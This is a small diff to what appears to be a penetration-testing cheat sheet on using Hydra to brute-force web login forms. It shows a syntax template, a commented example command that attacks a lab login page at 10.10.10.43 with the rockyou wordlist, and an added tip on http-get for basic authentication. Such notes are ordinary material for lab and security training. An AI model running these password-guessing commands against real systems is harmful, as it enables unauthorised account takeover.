@@ -13,3 +13,6 @@ hydra -L <users_file> -P <password_file> <url> http[s]-[post|get]-form \
 "<Path>:<RequestBody>:<IncorrectVerbiage>"
 
 #sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"
+
+# TO bruteforce a page that requires automatic browser autentication we employ the form http-get (not http-get-form)
+#
